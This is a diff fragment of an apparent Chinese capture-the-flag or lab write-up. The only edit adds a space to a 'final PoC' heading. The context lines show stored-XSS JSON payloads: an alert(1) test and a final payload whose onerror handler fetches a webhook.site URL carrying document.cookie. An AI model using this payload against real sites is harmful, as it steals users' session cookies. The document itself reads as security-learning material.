@@ -42,7 +42,7 @@ Poc
 {"content":"\" onerror=alert(1)>\"","layoutId":3}
 ```
 
-最终poc
+最终 poc
 
 ```JSON
 {"content":"\" onerror=fetch('https://webhook.site/f57e3466-a8a4-4a5c-968a-551c1543af38?flag='+document.cookie)>\"","layoutId":2}
